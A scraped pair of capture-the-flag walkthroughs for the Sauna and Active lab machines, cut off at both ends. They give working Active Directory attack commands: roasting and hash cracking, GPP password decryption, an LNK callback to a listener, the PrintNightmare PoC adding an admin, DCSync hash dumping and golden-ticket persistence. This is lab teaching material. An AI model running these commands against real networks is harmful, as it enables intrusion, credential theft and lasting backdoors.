|_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing 49667/tcp open msrpc Microsoft Windows RPC 49673/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49674/tcp open msrpc Microsoft Windows RPC 49677/tcp open msrpc Microsoft Windows RPC 49698/tcp open msrpc Microsoft Windows RPC 49717/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose Running (JUST GUESSING): Microsoft Windows 2019 (89%) Aggressive OS guesses: Microsoft Windows Server 2019 (89%) No exact OS matches for host (test conditions non-ideal). Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2024-11-03T15:08:18 |_ start_date: N/A |_clock-skew: 7h00m00s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required OS and Service detection performed. Please report any incorrect resu LDAP 389: Using LDAP to enumerate further: If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.\nWe can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapire https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb python3 ldapchecker.py $box It will dump general information \u0026amp; also detailed \u0026amp; simple information including: Groups Users It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.\nWe have the naming context of the domain:\nkali in HTB/BlogEntriesMade/Sauna/scans/ldap 🍣 main 2GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 08:08:25 zsh ❯ python3 /home/kali/windowsTools/enumeration/ldapire.py $box Attempting to connect to 10.129.118.79 with SSL... Failed to connect with SSL. Attempting to connect to 10.129.118.79 with non-SSL... Connected successfully using anonymous bind. Retrieving server information... DSA info (from DSE): Supported LDAP versions: 3, 2 Naming contexts: DC=EGOTISTICAL-BANK,DC=LOCAL CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL CN=Schema,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL DC=DomainDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL DC=ForestDnsZones,DC=EGOTISTICAL-BANK,DC=LOCAL We have the domain functionality level:\nOther: domainFunctionality: 7 forestFunctionality: 7 domainControllerFunctionality: 7 rootDomainNamingContext: DC=EGOTISTICAL-BANK,DC=LOCAL The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: that any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 7 which means that this server has to be running Windows Server 2016 or newer.\nHere\u0026rsquo;s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nAgain we can see this has the CN as the base (mentioned previously.) serverName: CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. Updating ETC/HOSTS \u0026amp; Variables Updated Domain \u0026amp; Machine Variables for Testing: Now that I have this information, I can update the `domain` and `machine` variables used in tests: update_var domain \u0026quot;EGOTISTICAL-BANK.LOCAL\u0026quot; update_var machine \u0026quot;SUANA\u0026quot; +Note+: This is a type-o it should say SAUNA I corrected this later. Always copy and paste! Updating /etc/hosts for DNS and LDAP Queries: I update my /etc/hosts file to enable tools like kerbrute for user enumeration and other tools that require DNS or LDAP for queries: echo \u0026quot;$box $domain $machine.$domain\u0026quot; | sudo tee -a /etc/hosts Syncing Clocks for Kerberos Exploitation: Since Kerberos is enabled on this host, it\u0026rsquo;s best practice to sync our clock with the host\u0026rsquo;s. This helps avoid issues from clock misalignment, which can cause false negatives in Kerberos exploitation attempts. sudo ntpdate -s $domain +Note+: I am doing this now as we have the DNS name etc. DNS 53: Using dnsenum to enumerate DNS entries: dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain Nothing of note. RPC: I connect via rpc and try and enumerate the groups \u0026amp; users but have nno perms: rpcclient -U '%' $box Kerberos 88: Using Kerbrute to bruteforce Usernames: As kerberos is present we can enumerate users using kerbrute : kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt We get two hits which I add to my list of users: hsmith@EGOTISTICAL-BANK.LOCAL fsmith@EGOTISTICAL-BANK.LOCAL Trying Usernames as Passwords: I always try usernames as passwords as well: netexec smb $box -u Users.txt -p Users.txt --shares --continue-on-success | grep [+] No hits. ASREPRoasting: Using netexec for ASReproasting: We should always try and asreproast with a null/guest session anyway netexec ldap $box -u '' -p '' --asreproast asrep.txt netexec ldap $box -u guest -p '' --asreproast asrep.txt We get no hits. Using Impacket-GetNPUsers for asreproasting: As we have some usernames we can try targeted asreproasting. impacket-GetNPUsers $domain/ -dc-ip $box -no-pass -usersfile Users.txt -format hashcat -outputfile asrep.txt We get a hit for fsmith Cracking fsmiths asrep hash using hashcat: I use hashcat to crack the ticket: hashcat -m 18200 asrep.txt /home/kali/Wordlists/rockyou.txt SMB 445: +Important note on methodology+: If you\u0026rsquo;re wondering why I am still enumerating for null sessions, web, etc when I have cracked a hash, it\u0026rsquo;s because there could still be some interesting findings and low-hanging fruit. Boxes are great as they train us and help us hone our skills, but businesses want all findings not just the most serious. It\u0026rsquo;s good practice to treat boxes like an engagement. I you want to jump ahead, go to the foothold section. Attempting to connect with NULL \u0026amp; Guest sessions: This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold: netexec smb $box -u 'guest' -p '' --shares Guest account is disabled. netexec smb $box -u '' -p '' --shares Null session has been disabled: Web 80: Web Enumeration via Burp Suite: When enumerating a website, always use Burp Suite. This allows you to: Record all potential injection points. Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress. Enumerating Injection Points: Looking at the site there appears to be an injection point in the Apply Now page: I enter data.\nOnce submitted I get the following response:\n405 - HTTP verb used to access this page is not allowed. Looking at the request and response in burpsuite we see the following:\nWe can see this was originally sent as a POST request, but the page only allows the following HTTP methods: GET, HEAD, OPTIONS, and TRACE. Let\u0026rsquo;s re-send our request using one of these allowed methods to observe the response. Verb Tampering Enumeration: I right-click the orginal request and select \u0026ldquo;Send to Repeater\u0026rdquo;:\nChecking GET Reqeuest:\nNothing of note. Checking HEAD Reqeuest:\nNothing of note. Checking OPTIONS Reqeuest:\nNothing of note. Checking TRACE Reqeuest:\nNothing of note. Dirbusting the webserver using ffuf: I Perform some directory busting to see if there are any interesting directories:\nffuf -w ~/Wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -u http://10.129.118.79/FUZZ -fc 403 -ic Nothing of note in the toplevel. I also check for additional files:\nffuf -w /home/kali/Wordlists/seclists/Discovery/Web-Content/raft-large-files.txt -u http://10.129.118.79/FUZZ.html -fc 403 -ic There does not seem to be anything immediatley obvious with the webserver so I am going to continue enumerating however now as our user.\n2. Foothold: Enumerating as fsmith: Enumerating shares: I see what shares we have access to: netexec smb $box -u $user -p $pass --shares There are some here which look interesting: SYSVOL (can hold scripts) print$ (printer drivers) RICOH Aficio SP 8300DN PCL 6 Enumerating the host via evil-winrm: I connect via evil-winrm:\nevil-winrm -i $box -u $user -p $pass I grab the user flag:\nChecking privileges and group membership: Group:\nwhoami /groups nothing of note Privs:\nwhoami /priv nothing of note Enumerating users: We can see that there is a user called svc_loanmgr so there is a service account running somewhere. I will enumerate more users and groups using impacket. Enumerating Users \u0026amp; Groups on the domain using impacket-lookupsid: I run impacket-lookupsid to enumerate all users and groups on the domain: impacket-lookupsid $user@$box -domain-sids As expected no other users on the domain apart from the standard built in ones. I add these users to my user list. Using smbclient to enumerate shares: print$ share enumeration:\nsmbclient -U $user \u0026quot;\\\\\\\\$box\\\\print$\u0026quot; +Note+: This appears to be a standard printer share. I will leave this for the moment and come back to it later if needed. NETLOGON share enumeration:\nsmbclient -U $user \u0026quot;\\\\\\\\$box\\\\NETLOGON\u0026quot;\nIt\u0026rsquo;s empty (as expected) SYSVOL share enumeration:\nsmbclient -U $user \u0026quot;\\\\\\\\$box\\\\SYSVOL\u0026quot; Scripts dir is empty: Ricoh share enumeration:\nsmbclient -U $user \u0026quot;\\\\\\\\$box\\\\RICOH Aficio SP 8300DN PCL 6\u0026quot;\nEmpty but writeable, we can come back to this later. Kerberoasting hsmith: As we have credentials we can perform kerberoasting:\nI use netexec to kerberoast: netexec ldap $machine.$domain -u $user -p $pass --kerberoasting kerb.out We get a hit for hsmith Cracking hsmith\u0026rsquo;s password with hashcat: I run it through hashcat and crack the hash: hashcat -m 13100 kerb.out ~/Wordlists/rockyou.txt It cracks, annoyingly it\u0026rsquo;s the same password as fsmith so I should have checked for password re-use between users, this is a learning moment. Enumerating as hsmith: Checking the shares they have access to we can see it\u0026rsquo;s the same as fsmith.\nInterestingly they do not have win-rm access.\nCreating an LNK file on the rico share: I create an LNK file on the rico share using netexec:\nnetexec smb $box -u $user -p $pass -M slinky -o SERVER=10.10.14.121 NAME=important I start my listener using responder:\nsudo responder -I tun0 I leave it running for a long time but do not get a hit. LNK attack Explanation: Even though this didn\u0026rsquo;t work I wanted to explain the concept and methodology. Creating an LNK file on the rico SMB share using netexec allows me to inject a shortcut that, when opened, will trigger code execution with minimal user interaction. By specifying the parameters SERVER=10.10.14.121 and NAME=important, I\u0026rsquo;m directing the LNK to attempt a network connection to my listener at 10.10.14.121, exploiting the target\u0026rsquo;s file interaction to potentially escalate privileges or gain further access. This setup leverages user trust in shared network files, making it a low-profile way to initiate a callback for further exploitation. Performing a bloodhound scan: Usually I would do this first, however I got caught up in easy low-hanging fruit priv-esc paths. bloodhound-python -dc $machine.$domain -c All -u $user -p $pass -d $domain -ns $box Looking at the results there is nothing immediately sticking out to me. Enumerating description fields using rpcclient: I connect using rpcclient and enumerate the description fields of the administrator and svc_loanmgr account in-case they had stored credentials in these field however they don\u0026rsquo;t have any: 3. Privilege Escalation: Privilege escalation Route 1 PrintNightmare: Discovering the host is susceptible to PrintNightmare vulnerability: netexec smb $box -u $user -p $pass -M printnightmare +Note+: I have a priv-esc checklist that I run through when I am working on machines and checking for PrintNightmare is one of these checks (I didn\u0026rsquo;t just magically stumbled upon the idea). However now we have a viable path forward. Privilege escalation Route 2 svc_loanmgr: There is also the option of this other privesc path (and I believe intended approach) Approach 1: Using winpeas to find clear-text creds stored in Registry Keys: I upload winpeas.ps1 via my evil-winrm session as fsmith:\nRunning it we find that there are creds available for win-logon which are stored in clear-text:\n+Note+: That the default username is svc_loanmanager however there is not user with that name on this machine. However there is a svc_loanmgr: Verifying the credentials work for svc_loanmgr:\nApproach 2: Manually Enumerating Registry Keys for Valuable Information: We can also search for these manually using: reg query \u0026quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\u0026quot; +Note+: Direct registry access may trigger logging events or alerts, especially if policies are in place. Discovering svc_loanmgr has DC-Sync privileges: Looking back in bloodhound we can see our user has GetChangesAll \u0026amp; GetChanges over the root domain object: Looking at the attack paths we have with GetChangesAll we can see we can:\nYou may perform a dcsync attack to get the password hash of an arbitrary principal using impacket\u0026rsquo;s secretsdump.py example script:\nThis means we can perform a dcsync attack to get the hashes. Overview of these rights: Replicating Directory Change (GetChanges): Display Name: Replicating Directory Changes Common Name: DS-Replication-Get-Changes, GetChanges Rights GUID Value: 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2 Interpretation: Required to replicate changes from a given NC (Naming Context). To perform a DCSync attack, this extended right and DS-Replication-Get-Changes-All (below) +are required+. In bloodhound displayed as: GetChanges Replicating Directory Changes All (GetChangesAll): Display Name: Replicating Directory Changes All Common Name: DS-Replication-Get-Changes-All, GetChangesAll Rights GUID Value: 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2 Interpretation: Allows the replication of secret domain data. To perform a DCSync attack, this extended right and DS-Replication-Get-Changes (above) +are required+. In bloodhound displayed as: GetChangesAll 4. Ownership: Privilege escalation Route 1 PrintNightmare: Creating a new administrator user using CVE-2021-1675 (PrintNightmare exploit): Download POC:\ngit clone https://github.com/calebstewart/CVE-2021-1675.git This is the exploit I have used before so will use again. Using our existing fsmith credentials upload the script via evil-winrm:\nBypass Execution Policy:\nSet-ExecutionPolicy Bypass -Scope Process Import the exploit Module:\nImport-Module .\\CVE-2021-1675.ps1 Add our new user with PrintNightmare PowerShell PoC:\nInvoke-Nightmare -NewUser \u0026quot;bloodstiller\u0026quot; -NewPassword \u0026quot;Pwnd1234!\u0026quot; -DriverName \u0026quot;PrintIt\u0026quot; Confirm our user added is added:\nnet user bloodstiller We can see we have local admin privs. Connecting as our new local-admin user: I connect usin evil-winrm\nAs we have local admin privs we can retrieve the flag from the administrator folder:\nPrivilege escalation Route 2 svc_loanmgr: Performing a DC-SYNC attack as svc_loanmgr: We perform the dc-sync attack using svc_loanmgr account and impacket-secretsdump: impacket-secretsdump $domain/$user:$pass@$box -dc-ip $box All of the same steps can be peformed to create a golden ticket in the persistence section now etc. 5. Persistence: Dumping NTDS.dit/DC-SYNC attack: As we are local admin we can perform a DCSync Attack using netexec:\nnetexec smb $box -u $user -p $pass -M ntdsutil Extract all hashes from netexec\nfor file in /home/kali/.nxc/logs/*.ntds; do cat \u0026quot;$file\u0026quot; | cut -d ':' -f1,2,4 --output-delimiter=' ' | awk '{print $3, $2, $1}'; printf '\\n'; done Creating a Kerberos Golden Ticket: Using impacket-lookupsid to get the Search for the Domain SID:\nimpacket-lookupsid $domain/$user@$machine.$domain -domain-sids Sync our clock to the host using ntupdate:\nsudo ntpdate -s $domain This does not need to be done again (as I have already done it. However i\u0026rsquo;ve left it here in case when you do this you forget) Using impacket-ticketer to create the Golden Ticket:\nimpacket-ticketer $box -nthash [KRBTGTHash] -domain-sid [SID] -domain $domain Administrator Export the ticket to the KRB5CCNAME Variable:\nexport KRB5CCNAME=./Administrator.ccache Use the ticket for connecting via psexec\nimpacket-psexec -k -no-pass $machine.$domain Why create a golden ticket? \u0026ldquo;But bloodstiller why are you making a golden ticket if you have the admin hash?\u0026rdquo; Glad you asked: Creating a Golden Ticket during an engagement is a reliable way to maintain access over the long haul. Here\u0026rsquo;s why: KRBTGT Hash Dependence: Golden Tickets are generated using the KRBTGT account hash from the target\u0026rsquo;s domain controller. Unlike user account passwords, KRBTGT hashes are rarely rotated (and in many organizations, they are never changed), so the Golden Ticket remains valid indefinitely. KRBTGT Hash—The Key to It All (for upto 10 years): A Golden Ticket can allow you to maintain access to a system for up to 10 years (yeah, you read that right the default lifespan of a golden ticket is 10 years) without needing additional credentials. This makes it a reliable backdoor, especially if re-access is needed long after initial entry. Think about it: even if they reset every user\u0026rsquo;s password (including the administrator etc) your Golden Ticket is still valid because it\u0026rsquo;s tied to the KRBTGT account, not individual users. Lessons Learned: What did I learn? I should always check for password re-use even between accounts! It was good to attack this from a privilege escalation point of view from 2 different angles, showing the more recent PrintNightmare as well as the intended route of WinLogon clear-text creds. What silly mistakes did I make? Should have copied and pasted, ended up writing suana instead of sauna in my /etc/hosts Sign off: Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!\nUntil next time, hack the planet!\n– Bloodstiller\n– Get in touch bloodstiller at proton dot me\n",

        "content": "Active Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Active How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walktrhoughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: Basic TCP Scan: nmap $box -Pn -oA TCPbasicScan kali in HTB/BlogEntriesMade/Active/scans/nmap 🍣 main 📝 ×115🛤️ ×225 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 21:57:59 zsh ❯ nmap $box -Pn -oA TCPbasicScan Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-01 21:58 GMT Nmap scan report for 10.129.58.199 Host is up (0.041s latency). Not shown: 983 closed tcp ports (reset) PORT STATE SERVICE 53/tcp open domain 88/tcp open kerberos-sec 135/tcp open msrpc 139/tcp open netbios-ssn 389/tcp open ldap 445/tcp open microsoft-ds 464/tcp open kpasswd5 593/tcp open http-rpc-epmap 636/tcp open ldapssl 3268/tcp open globalcatLDAP 3269/tcp open globalcatLDAPssl 49152/tcp open unknown 49153/tcp open unknown 49154/tcp open unknown 49155/tcp open unknown 49157/tcp open unknown 49158/tcp open unknown Nmap done: 1 IP address (1 host up) scanned in 3.89 seconds Initial thoughts: SMB, Kerberos, SMB, LDAP \u0026amp; RPC are great enumeration targets Comprehensive Scans: In depth scan TCP:\nsudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP kali in HTB/BlogEntriesMade/Active/scans/nmap 🍣 main 📝 ×115🛤️ ×225 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 21:58:38 zsh ❯ sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP [sudo] password for kali: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-01 21:59 GMT Nmap scan report for 10.129.58.199 Host is up (0.040s latency). Not shown: 65512 closed tcp ports (reset) PORT STATE SERVICE VERSION 53/tcp open domain Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1) | dns-nsid: |_ bind.version: Microsoft DNS 6.1.7601 (1DB15D39) 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-11-01 15:05:52Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5722/tcp open msrpc Microsoft Windows RPC 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49157/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49158/tcp open msrpc Microsoft Windows RPC 49162/tcp open msrpc Microsoft Windows RPC 49166/tcp open msrpc Microsoft Windows RPC 49168/tcp open msrpc Microsoft Windows RPC No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.94SVN%E=4%D=11/1%OT=53%CT=1%CU=39275%PV=Y%DS=2%DC=I%G=Y%TM=6725 OS:510D%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=104%CI=I%II=I%TS=7)SEQ(S OS:P=105%GCD=1%ISR=104%TI=I%CI=I%II=I%TS=7)OPS(O1=M53CNW8ST11%O2=M53CNW8ST1 OS:1%O3=M53CNW8NNT11%O4=M53CNW8ST11%O5=M53CNW8ST11%O6=M53CST11)WIN(W1=2000% OS:W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M53CN OS:W8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R= OS:Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=A OS:R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%D OS:F=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=8 OS:0%CD=Z) Network Distance: 2 hops Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows Host script results: | smb2-security-mode: | 2:1:0: |_ Message signing enabled and required | smb2-time: | date: 2024-11-01T15:07:00 |_ start_date: 2024-11-01T14:46:20 |_clock-skew: -7h00m00s OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 452.68 seconds LDAP 389: Using LDAP anonymous bind to enumerate further: If you are unsure of what anonymous bind does. It enables us to query for domain information anonymously, e.g. without passing credentials.\nWe can actually retrieve a significant amount of information via anonymous bind such as: A list of all users A list of all groups A list of all computers. User account attributes. The domain password policy. Enumerate users who are susceptible to AS-REPRoasting. Passwords stored in the description fields The added benefit of using ldap to perform these queries is that these are most likely not going to trigger any sort of AV etc as ldap is how AD communicates. I actually have a handy script to check if anonymous bind is enabled \u0026amp; if it is to dump a large amount of information. You can find it here\nhttps://github.com/bloodstiller/ldapire https://bloodstiller.com/cheatsheets/ldap-cheatsheet/#ldap-boxes-on-htb python3 ldapchecker.py $box It will dump general information \u0026amp; also detailed \u0026amp; simple information including: Groups Users It turns out the anonymous bind is enabled and we get the below information. I have removed the majority of the information as it is not relevant, however there are some keys bits of information we can use moving forward.\nWe have the naming context of the domain:\nkali in HTB/BlogEntriesMade/Active/scans/ldap 🍣 main 📝 ×115🛤️ ×225 1GiB/7GiB | 0B/1GiB with /usr/bin/zsh 🕙 22:00:23 zsh ❯ python3 /home/kali/windowsTools/enumeration/ldapire.py $box Attempting to connect to 10.129.58.199 with SSL... Failed to connect with SSL. Attempting to connect to 10.129.58.199 with non-SSL... Connected successfully using anonymous bind. Retrieving server information... DSA info (from DSE): Supported LDAP versions: 3, 2 Naming contexts: DC=active,DC=htb CN=Configuration,DC=active,DC=htb CN=Schema,CN=Configuration,DC=active,DC=htb DC=DomainDnsZones,DC=active,DC=htb DC=ForestDnsZones,DC=active,DC=htb We have the domain functionality level:\ndomainFunctionality: 4 forestFunctionality: 4 domainControllerFunctionality: 4 The functionality level determines the minimum version of Windows server that can be used for a DC. +Note+: that any host os can be used on workstations, however the functionality level determines what the minimum version for DC\u0026rsquo;s and the forest.\nhttps://learn.microsoft.com/en-us/windows-server/identity/ad-ds/active-directory-functional-levels Knowing the function level is useful as if want to target the DC\u0026rsquo;s and servers, we can know by looking at the function level what the minimum level of OS would be.\nIn this case we can see it is level 4 which means that this server has to be running Windows Server 2008 or newer.\nHere\u0026rsquo;s a list of functional level numbers and their corresponding Windows Server operating systems:\nFunctional Level Number Corresponding OS 0 Windows 2000 1 Windows Server 2003 Interim 2 Windows Server 2003 3 Windows Server 2008 4 Windows Server 2008 R2 5 Windows Server 2012 6 Windows Server 2012 R2 7 Windows Server 2016 8 Windows Server 2019 9 Windows Server 2022 +Note+: Each number corresponds to the minimum Windows Server version required for domain controllers in the domain or forest. As the functional level increases, additional Active Directory features become available, but older versions of Windows Server may not be supported as domain controllers. We have the full server name:\nAgain we can see this has the CN as the base (mentioned previously.) serverName: CN=DC,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=active,DC=htb It\u0026rsquo;s pretty amazing already what we have learned just by running some fairly simple ldap queries.\nWe have the naming context. Domain name. I update my /etc/hosts file now that we have the server name.\nThis is so we can use tools like kerbrute for user enumeration as well as other tools later on. echo \u0026quot;$box $domain $machine.$domain\u0026quot; | sudo tee -a /etc/hosts DNS 53: Using dnsenum to enumerate DNS entries: dnsenum -r --dnsserver $box --enum -p 0 -s 0 -f ~/Wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt $domain Nothing of note just standard dns entries for a DC. Kerberos 88: Using Kerbrute to bruteforce Usernames: As kerberos is present we can enumerate users using kerbrute : kerbrute userenum -d $domain --dc $box ~/Wordlists/statistically-likely-usernames/jsmith.txt Nothing of note. SMB 445: Attempting to connect with NULL \u0026amp; Guest sessions: This is a standard check I always try as alot of the time the guest account or null sessions can lead to a foothold: netexec smb $box -u '' -p '' --shares Null session is valid: We can see we can access the replication Share: netexec smb $box -u 'guest' -p '' --shares Guest account is disabled: Enumerating the Replication share using smbclient: As we can connect using a null session we can use smbclient to enumerate the replication share:\nsmbclient -N \u0026quot;\\\\\\\\$box\\\\Replication\u0026quot; Enumerating the share I find a Groups.xml file in the Polices folder:\nI download it:\nget {31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\Groups.xml Finding hard-coded creds for SVC_TGS user: In the Groups.xml I find hard-coded credentials, albeit hashed in the file. cpassword primer: TL\u0026rsquo;DR: The cpassword attribute in Group Policy Preferences (GPP) stores encrypted passwords for accounts configured through GPP. This can be decrypted using gpp-decrypt (in kali).\nPurpose and Function:\nPurpose: Used in GPP to store passwords for tasks like setting local administrator accounts, mapping network drives, and configuring services. (in this case the SVC_TGS service) Attribute: Appears in the XML files of GPP as cpassword, storing the encrypted password value. Files: Typically found in SYSVOL folder of a domain, making it accessible to any domain user. However as you can see it can be present in any share. Encryption and Format:\nEncryption: AES-256-CBC, but with a +static key+ that was hardcoded by Microsoft. You read that right, MS hardcoded the a static key for this…. Key Problem: The static encryption key is publicly known, which effectively nullifies the security benefits of encryption. We can decrypt it using the tool gpp-decrypt Encoding: The encrypted password is Base64-encoded, making it readable as an alphanumeric string in XML files. Vulnerability and Security Concerns:\nAccess and Exploitability: Since the SYSVOL share is accessible to all authenticated domain users, anyone can read the XML files containing cpassword. Decryption: Due to the static key, tools like gpp-decrypt (or manual decryption using the known key) can easily decrypt the password. Privilege Escalation: Attackers, like us, can leverage cpassword to obtain plaintext passwords, often leading to privilege escalation by compromising local or service accounts with elevated privileges. Microsoft\u0026rsquo;s response to the key disclosure:\nMicrosoft discontinued the use of cpassword in GPP with a patch in 2014 (MS14-025), which removed the ability to set passwords in GPP. The only reason this is present on this machine is that it\u0026rsquo;s running windows server 2008. Microsoft advised using more secure methods like LAPS (Local Administrator Password Solution) for managing local administrator credentials. Mitigation and Detection\nRemoval of Legacy GPPs: Ensure any remaining GPP configurations with cpassword are removed from domain controllers. Access Controls: Limit access to the SYSVOL share, though this is challenging due to default domain-wide access. Use of LAPS: Implementing LAPS or other secure solutions for local password management can prevent similar vulnerabilities. Decrypting the SVC_TGS password using gpp-decrypt: I decrypt the password using gpp-decrypt:\ngpp-decrypt [hash] Checking if the creds are valid:\nnetexec smb $box -u $user -p $pass --shares Looks like we have access to Users share 2. Foothold: Enumerating Users with impacket-lookupsid: As we have valid creds now I like to enumerate all users groups on the domain. We can use impacket-lookupsid to enumerate users on the domain: impacket-lookupsid $domain/$user@$machine.$domain -domain-sids Not many users on the domain. Enumerating the users share as SVC_TGS: I connect as the SVC_TGS user using smbclient:\nsmbclient -U $user \u0026quot;\\\\\\\\$box\\\\Users\u0026quot; Looking at the share it\u0026rsquo;s user home folders:\nI try and access the administrator folder but I am denied:\nChecking our home folder I retrieve the user flag\nI query all users and groups using rpcclient: This does provide any additional information. 3. Privilege Escalation: Extracting the Administrator Hash via Kerberoasting: I try kerberoasting with netexec: netexec ldap $box -u $user -p $pass --kerberoasting kerb.out I get a hit for the administrator: +Note+: It\u0026rsquo;s good practice to try Kerberoasting when we have creds as it can provide an easy win. Cracking the Admin Hash: hashcat -m 13100 kerb.out ~/Wordlists/rockyou.txt\nWe crack it:\nI check the cred using netexec \u0026amp; it works:\n4. Ownership: Cracking the Admin Hash to reveal the clear-text password hashcat -m 13100 kerb.out ~/Wordlists/rockyou.txt\nWe crack it and :\nI check the cred using netexec \u0026amp; it works:\n5. Persistence: Dumping NTDS.dit/DC-SYNC attack: Perform DC-Sync attack using netexec:\nnetexec smb $box -u $user -p $pass -M ntdsutil Extract all hashes from netexec\ncat /home/kali/.nxc/logs/*.ntds | cut -d ':' -f1,2,4 --output-delimiter=' ' | awk '{print $3, $2, $1}' Creating a Kerberos Golden Ticket: Using impacket-lookupsid to get the Search for the Domain SID:\nimpacket-lookupsid $domain/$user@$machine.$domain -domain-sids S-1-5-21-405608879-3187717380-1996298813 Sync our clock to the host using ntupdate:\nsudo ntpdate -s $domain Using impacket-ticketer to create the 